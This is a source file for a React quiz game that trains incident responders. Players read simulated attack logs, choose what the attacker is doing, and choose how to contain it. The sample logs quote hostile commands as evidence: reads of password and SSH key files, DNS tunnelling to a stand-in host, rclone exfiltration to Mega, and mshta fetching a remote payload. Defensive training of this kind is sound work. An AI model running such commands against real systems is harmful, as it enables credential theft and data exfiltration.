import { useEffect, useMemo, useState } from "react";
import { Button } from "@/components/ui/button";
import { Progress } from "@/components/ui/progress";
import { CheckCircle2, XCircle, Search, ChevronRight, Terminal } from "lucide-react";

interface Step {
  id: number;
  prompt: string;
  log: string;
  hint?: string;
  options: { text: string; correct: boolean; why: string }[];
}

interface Props {
  tier: 1 | 2 | 3;
  onSuccess: () => void;
  onFail: () => void;
}

// Harder traces: each option is plausible, requires reading the log carefully,
// noticing timestamps, ports, parent processes, byte counts, user-agents, etc.
const KILL_CHAIN: Record<1 | 2 | 3, Step[]> = {
  1: [
    {
      id: 1,
      prompt: "What's the real initial access vector?",
      log:
        "08:14:02  auth.log   failed_login user=admin src=203.0.113.7 (x142 over 11m)\n" +
        "08:14:09  auth.log   SUCCESS    user=admin src=203.0.113.7 ua=\"curl/8.4\"\n" +
        "08:14:09  web        GET /admin/login 200 referer=- ua=\"curl/8.4\"",
      hint: "Look at the user-agent and the referer, not just the failure count.",
      options: [
        { text: "Password spray that finally hit", correct: false, why: "Spraying rotates users, not one user 142 times — this is targeted." },
        { text: "Credential-stuffing replay with a scripted client", correct: true, why: "Single user, scripted curl UA, no browser referer, success right after the bursts — leaked creds replayed by a tool." },
        { text: "Stolen session cookie reused", correct: false, why: "Cookie replay would skip /login entirely and hit an authenticated route." },
        { text: "Phishing kit captured the password", correct: false, why: "No mail or proxy event appears in this slice — pure auth + web." },
      ],
    },
    {
      id: 2,
      prompt: "What is the attacker actually doing on-host?",
      log:
        "08:21:55  audit  user=admin exec=/usr/bin/find args=\"/ -perm -4000 -type f\"\n" +
        "08:22:10  audit  user=admin read /etc/shadow size=2.1KB\n" +
        "08:22:11  audit  user=admin read /root/.ssh/id_rsa size=3.2KB",
      hint: "The find command is the giveaway — what is -perm -4000 for?",
      options: [
        { text: "Just stealing /etc/shadow", correct: false, why: "Shadow is only one of three reads — and the find is a privesc sweep, not a download." },
        { text: "Hunting SUID binaries for privilege escalation, then looting secrets", correct: true, why: "-perm -4000 enumerates SUID; followed by shadow + private SSH key reads = recon → loot chain." },
        { text: "Backing up the system", correct: false, why: "Backups don't selectively read shadow and a single user's private key." },
        { text: "Searching for malware", correct: false, why: "AV tools don't run as the breached admin and grab the private key on the way out." },
      ],
    },
    {
      id: 3,
      prompt: "Pick the actual exfil channel.",
      log:
        "08:29:58  fw  ALLOW 10.0.0.5 -> 8.8.8.8:53     udp  bytes=512\n" +
        "08:30:01  fw  ALLOW 10.0.0.5 -> 8.8.8.8:53     udp  bytes=512\n" +
        "08:30:04  fw  ALLOW 10.0.0.5 -> 8.8.8.8:53     udp  bytes=512  (x84 in 90s, qname=<256B base32>.evil.tld)",
      hint: "8.8.8.8 looks innocent — what's actually in the queries?",
      options: [
        { text: "HTTPS upload to a C2", correct: false, why: "There's no 443 traffic in this slice — port is 53." },
        { text: "DNS tunneling: data smuggled in long subdomain labels to evil.tld", correct: true, why: "Google's resolver is just the hop; the qname carries base32-encoded chunks of the stolen files." },
        { text: "Routine name resolution", correct: false, why: "Real DNS doesn't repeat 256-byte base32 subdomains 84 times." },
        { text: "NTP time sync", correct: false, why: "NTP is 123/udp and wouldn't carry application data." },
      ],
    },
  ],
  2: [
    {
      id: 1,
      prompt: "Where did the attacker really get the credential?",
      log:
        "10:58  proxy  jdoe GET https://acme-okta.com/login  (cert: LetsEncrypt, age=3d)\n" +
        "11:02  mail   to=jdoe subj=\"MFA reset required\" link=https://acme-okta.com/reset\n" +
        "11:03  okta   push_approved user=jdoe device=iPhone-jdoe geo=NG",
      hint: "Compare the domain, the cert age, and where the MFA push came from.",
      options: [
        { text: "Classic credential phishing page", correct: false, why: "It's worse — the attacker also defeated MFA in the same flow." },
        { text: "Adversary-in-the-middle proxy phish that relayed the MFA push", correct: true, why: "Look-alike domain on a 3-day LE cert + MFA push approved from Nigeria = AiTM kit (evilginx-style) proxying the session in real time." },
        { text: "Insider with admin badge", correct: false, why: "Insider wouldn't trigger a foreign-geo MFA push." },
        { text: "Malware on the laptop stole the token", correct: false, why: "No endpoint events here — the chain is purely web + mail + IdP." },
      ],
    },
    {
      id: 2,
      prompt: "How is the attacker moving laterally?",
      log:
        "11:18  win-evt 4624 logon_type=9  user=jdoe   src=WS-12  process=mimikatz.exe\n" +
        "11:19  win-evt 4624 logon_type=3  user=svc_backup src=WS-12  dst=DC01\n" +
        "11:20  win-evt 4769 svc_backup requested TGS for cifs/DC01",
      hint: "Logon type 9 + a different user appearing 60s later is the tell.",
      options: [
        { text: "Pass-the-hash with the phished user", correct: false, why: "jdoe never authenticates to DC01 here — a service account does." },
        { text: "Overpass-the-hash → Kerberos TGS as svc_backup (token theft after mimikatz)", correct: true, why: "Type-9 NewCredentials + mimikatz = token/hash theft; then svc_backup mints a TGS to DC01 over CIFS." },
        { text: "Physical walk to the server room", correct: false, why: "Generates no 4624/4769 events." },
        { text: "Phished user opening RDP", correct: false, why: "RDP would be logon type 10, not 3." },
      ],
    },
    {
      id: 3,
      prompt: "Pick the real objective.",
      log:
        "11:38  dlp    pattern=PAN-16  hits=4920  dest=onedrive-personal@gmail-relay\n" +
        "11:39  edr    rclone.exe spawned by powershell, args=\"copy C:\\db-dump\\ mega:exfil\"\n" +
        "11:40  fw     ALLOW 10.0.5.12 -> 198.51.100.22:443  bytes=812MB sustained",
      hint: "Multiple destinations at once — what does that say about staging?",
      options: [
        { text: "Bulk PII exfil to a single cloud sync", correct: false, why: "There are three different egress paths firing simultaneously." },
        { text: "Multi-channel exfil (personal OneDrive + Mega + raw HTTPS) to defeat single-channel blocks", correct: true, why: "Attackers split exfil across consumer cloud services and direct upload so blocking one doesn't stop the bleed." },
        { text: "Scheduled backup", correct: false, why: "Backups don't use rclone to a personal Mega account." },
        { text: "Cloud migration project", correct: false, why: "Migrations don't trip DLP on 4,920 card numbers." },
      ],
    },
    {
      id: 4,
      prompt: "Pick the highest-impact containment action right now.",
      log:
        "11:42  soc  options on table:\n" +
        "        A) disable jdoe                  B) block 198.51.100.22\n" +
        "        C) revoke ALL jdoe sessions+refresh tokens in IdP + kill rclone + sinkhole egress\n" +
        "        D) wait for legal sign-off",
      hint: "AiTM means the active *session* matters more than the password.",
      options: [
        { text: "Just disable the user account", correct: false, why: "AiTM stole a live session — disabling the account doesn't kill the existing token." },
        { text: "Block the one destination IP", correct: false, why: "Exfil is multi-channel; blocking one IP leaves Mega + OneDrive open." },
        { text: "Revoke all sessions/refresh tokens, kill rclone, sinkhole egress, then disable user", correct: true, why: "Kills the live token, stops the in-flight upload, and closes lateral pivots in one move." },
        { text: "Wait for legal sign-off", correct: false, why: "Every second is more PII out the door — contain now, document in parallel." },
      ],
    },
  ],
  3: [
    {
      id: 1,
      prompt: "Identify the real initial vector.",
      log:
        "02:09  edr  scada-op-3  winword.exe -> mshta.exe http://cdn-img[.]co/a.hta\n" +
        "02:09  dns  cdn-img.co  A 45.77.x.x  age=2h\n" +
        "02:10  edr  mshta.exe -> powershell -nop -w hidden -enc <b64>\n" +
        "02:10  proxy NO entry for cdn-img.co (DoH used)",
      hint: "Notice what's *missing* from the proxy log.",
      options: [
        { text: "Plain macro dropper", correct: false, why: "Macros don't usually chain through mshta and bypass the proxy via DoH." },
        { text: "HTA smuggling via Word → mshta with DNS-over-HTTPS to dodge the proxy", correct: true, why: "Word spawning mshta to fetch an HTA on a 2-hour-old domain, with DoH hiding the fetch from the corporate proxy." },
        { text: "Legit Office update", correct: false, why: "Updates don't run encoded PowerShell from hidden windows." },
        { text: "User browsing the web", correct: false, why: "Browsing wouldn't originate from winword.exe." },
      ],
    },
    {
      id: 2,
      prompt: "How are they persisting?",
      log:
        "02:14  wmi   __EventFilter 'OnLogon' bound to CommandLineConsumer\n" +
        "                 cmd=powershell -enc <b64>  (loads from HKCU\\Software\\Classes\\...\\shell)\n" +
        "02:14  reg   HKLM\\...\\Run 'svhost' -> C:\\ProgramData\\u.exe  (decoy)\n" +
        "02:15  sch   \\Microsoft\\Windows\\UpdateOrchestrator\\Reboot  modified  action=u.exe",
      hint: "The Run key is loud. What's the quiet one designed to survive cleanup?",
      options: [
        { text: "Only the Run-key autostart", correct: false, why: "That's the decoy — easiest to find and remove." },
        { text: "WMI permanent event subscription (fileless, runs as SYSTEM at logon) — Run key + task are bait", correct: true, why: "WMI __EventFilter + CommandLineConsumer survives reboots, runs as SYSTEM, and is invisible to most cleanup playbooks." },
        { text: "Scheduled task only", correct: false, why: "The task is a backup mechanism, not the primary." },
        { text: "No persistence — one-shot payload", correct: false, why: "Three persistence artifacts in one minute is the opposite of one-shot." },
      ],
    },
    {
      id: 3,
      prompt: "What are they actually pivoting toward?",
      log:
        "02:31  net   scada-op-3 -> 192.168.30.0/24  tcp/502  (modbus enumerate)\n" +
        "02:32  net   scada-op-3 -> 192.168.30.0/24  tcp/44818 (ethernet/ip)\n" +
        "02:33  net   scada-op-3 -> 192.168.30.10   tcp/102   (S7comm)  WRITE coil request",
      hint: "Two of these are scans. One is not.",
      options: [
        { text: "OT discovery scan only", correct: false, why: "The S7comm WRITE is an *action* on a specific PLC, not recon." },
        { text: "Recon on Modbus/EthernetIP then a write to a Siemens PLC — moving from mapping to manipulation", correct: true, why: "Ports 502 and 44818 enumerate the segment; 102 is S7comm, and a coil WRITE is changing PLC state — kinetic intent." },
        { text: "Printer discovery", correct: false, why: "None of these are printer protocols." },
        { text: "Network speed test", correct: false, why: "Speed tests don't issue Modbus or S7 protocol verbs." },
      ],
    },
    {
      id: 4,
      prompt: "Pick the containment that stops kinetic impact without causing your own outage.",
      log:
        "02:34  soc  options:\n" +
        "  A) shut every plant down nationwide\n" +
        "  B) isolate scada-op-3, deny IT→OT at the conduit firewall, notify plant ops, freeze PLC writes via engineering workstation\n" +
        "  C) push a Windows patch fleet-wide\n" +
        "  D) only remove the Run key",
      hint: "You need surgical, not nuclear.",
      options: [
        { text: "Shut down every plant nationwide", correct: false, why: "Self-inflicted outage; the attacker only reached one cell." },
        { text: "Isolate host, deny IT→OT at the conduit, notify ops, freeze PLC writes", correct: true, why: "Cuts the attacker's reach, preserves safe operation, and protects the PLCs that are being written to." },
        { text: "Push a Windows patch fleet-wide", correct: false, why: "Patching mid-incident doesn't evict an attacker with WMI persistence." },
        { text: "Only remove the Run key", correct: false, why: "Leaves the WMI subscription and scheduled task fully intact." },
      ],
    },
    {
      id: 5,
      prompt: "Recovery priority?",
      log:
        "03:00  ir  recovery phase — choose order of operations",
      hint: "Persistence + OT credentials are the things that bite you next week.",
      options: [
        { text: "Rebuild from gold image, rotate ALL OT creds & PLC keys, hunt WMI subscriptions fleet-wide, then restore", correct: true, why: "Assumes deeper persistence, invalidates anything the attacker may have copied, and sweeps the same TTP across the fleet." },
        { text: "Delete one Run key and resume operations", correct: false, why: "Leaves WMI + task + stolen creds intact." },
        { text: "Disclose on social media first", correct: false, why: "Disclosure runs through legal/PR, not as a technical recovery step." },
        { text: "Re-enable everything and watch the logs", correct: false, why: "'Watch and hope' is not a containment strategy for ICS." },
      ],
    },
  ],
};

export default function TraceAttacker({ tier, onSuccess, onFail }: Props) {
  const steps = useMemo(() => KILL_CHAIN[tier], [tier]);
  const [idx, setIdx] = useState(0);
  const [picked, setPicked] = useState<number | null>(null);
  const [mistakes, setMistakes] = useState(0);
  const [showHint, setShowHint] = useState(false);
  const [timeLeft, setTimeLeft] = useState(tier === 1 ? 75 : tier === 2 ? 95 : 120);
  const [done, setDone] = useState(false);

  useEffect(() => {
    if (done || picked !== null) return;
    if (timeLeft <= 0) {
      setDone(true);
      setTimeout(onFail, 600);
      return;
    }
    const t = setTimeout(() => setTimeLeft((s) => s - 1), 1000);
    return () => clearTimeout(t);
  }, [timeLeft, done, picked, onFail]);

  const step = steps[idx];
  const progress = ((idx + (picked !== null ? 1 : 0)) / steps.length) * 100;
  const allowedMistakes = tier === 1 ? 1 : tier === 2 ? 1 : 2;

  const choose = (i: number) => {
    if (picked !== null || done) return;
    setPicked(i);
    if (!step.options[i].correct) setMistakes((m) => m + 1);
  };

  const next = () => {
    setShowHint(false);
    if (idx + 1 >= steps.length) {
      setDone(true);
      setTimeout(() => (mistakes <= allowedMistakes ? onSuccess() : onFail()), 500);
      return;
    }
    setIdx((i) => i + 1);
    setPicked(null);
  };

  return (
    <div className="space-y-3">
      <div className="flex items-center justify-between text-[11px]">
        <span className="text-muted-foreground flex items-center gap-1.5">
          <Search className="h-3 w-3" /> Stage {idx + 1}/{steps.length} · mistakes {mistakes}/{allowedMistakes}
        </span>
        <span className="font-mono text-primary">{timeLeft}s</span>
      </div>
      <Progress value={progress} className="h-1.5" />

      <div className="rounded-md border border-primary/30 bg-primary/5 p-2.5 font-mono text-[11px] text-primary/90 whitespace-pre-wrap break-words">
        <div className="flex items-center gap-1.5 mb-1.5 text-[10px] uppercase tracking-wider text-primary/60">
          <Terminal className="h-3 w-3" /> evidence
        </div>
        {step.log}
      </div>

      <p className="text-sm font-semibold text-white">{step.prompt}</p>

      {step.hint && !showHint && picked === null && (
        <button
          onClick={() => setShowHint(true)}
          className="text-[11px] text-muted-foreground underline hover:text-primary"
        >
          Reveal hint (costs nothing, but slows you down)
        </button>
      )}
      {step.hint && showHint && (
        <div className="text-[11px] text-accent border border-accent/30 bg-accent/5 rounded p-2">
          💡 {step.hint}
        </div>
      )}

      <div className="space-y-1.5">
        {step.options.map((o, i) => {
          const isPicked = picked === i;
          const reveal = picked !== null;
          const correct = o.correct;
          return (
            <button
              key={i}
              onClick={() => choose(i)}
              disabled={reveal}
              className={`w-full text-left text-xs p-2.5 rounded border transition-all ${
                reveal
                  ? correct
                    ? "border-success bg-success/10 text-success"
                    : isPicked
                      ? "border-destructive bg-destructive/10 text-destructive"
                      : "border-border opacity-50"
                  : "border-border hover:border-primary/50 hover:bg-primary/5"
              }`}
            >
              <div className="flex items-start gap-2">
                {reveal && correct && <CheckCircle2 className="h-4 w-4 flex-shrink-0 mt-0.5" />}
                {reveal && isPicked && !correct && <XCircle className="h-4 w-4 flex-shrink-0 mt-0.5" />}
                <div className="flex-1">
                  <div className="font-medium">{o.text}</div>
                  {reveal && (correct || isPicked) && (
                    <div className="mt-1 text-[11px] opacity-80">{o.why}</div>
                  )}
                </div>
              </div>
            </button>
          );
        })}
      </div>

      {picked !== null && !done && (
        <Button variant="cyber" className="w-full" onClick={next}>
          {idx + 1 >= steps.length ? "Finish Trace" : "Next Stage"} <ChevronRight className="h-4 w-4" />
        </Button>
      )}
    </div>
  );
}
